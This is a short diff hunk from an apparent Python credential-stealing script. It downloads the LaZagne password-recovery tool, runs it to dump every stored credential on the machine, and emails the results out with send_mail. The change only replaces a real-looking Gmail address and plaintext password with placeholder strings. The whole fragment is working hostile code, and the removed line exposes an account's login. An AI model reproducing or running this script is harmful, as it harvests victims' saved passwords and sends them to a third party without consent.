@@ -20,4 +20,4 @@ def download(url):
 download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe")
 command = "laZagne.exe all"
 result = subprocess.check_output(command, shell=True)
-send_mail("brawlwithprofessorenglish@gmail.com", "Kk1231234", result)
+send_mail("sdfsdf@gmail.com", "sdfdsf", result)
